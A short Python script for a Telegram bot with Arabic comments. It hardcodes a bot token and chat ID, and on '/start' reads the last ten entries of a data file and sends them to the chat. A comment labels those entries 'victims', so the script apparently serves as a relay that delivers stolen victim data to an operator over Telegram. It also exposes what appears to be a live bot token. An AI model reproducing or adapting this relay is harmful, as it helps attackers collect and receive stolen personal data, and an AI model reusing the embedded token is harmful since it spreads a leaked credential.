import requests
import time

TOKEN = '8613985953:AAEWC4xU0thhVyU1_LP0zGtXp5vf10lq4fE'
CHAT_ID = '6774435744'
BASE_URL = f'https://api.telegram.org/bot{TOKEN}'
DATA_FILE = 'data.txt'
LAST_UPDATE = 0

def get_updates():
    global LAST_UPDATE
    url = f'{BASE_URL}/getUpdates?offset={LAST_UPDATE+1}&timeout=30'
    try:
        resp = requests.get(url).json()
        if resp['ok']:
            for upd in resp['result']:
                LAST_UPDATE = upd['update_id']
                yield upd
    except Exception as e:
        print('Error:', e)

def handle_command(command, chat_id):
    if command == '/start':
        # قراءة آخر 10 سجلات من data.txt
        try:
            with open(DATA_FILE, 'r') as f:
                lines = f.readlines()
            if lines:
                last = lines[-10:]  # آخر 10 ضحايا
                msg = '📋 سجل البيانات:\n' + '\n'.join(last).strip()
            else:
                msg = 'لا توجد بيانات بعد.'
        except FileNotFoundError:
            msg = 'لا توجد بيانات بعد.'
        send_message(chat_id, msg)

def send_message(chat_id, text):
    url = f'{BASE_URL}/sendMessage'
    requests.post(url, json={'chat_id': chat_id, 'text': text})

def main():
    print('البوت شغال...')
    for update in get_updates():
        if 'message' in update:
            msg = update['message']
            if 'text' in msg:
                text = msg['text']
                chat_id = msg['chat']['id']
                if text.startswith('/'):
                    handle_command(text, chat_id)

if __name__ == '__main__':
    main()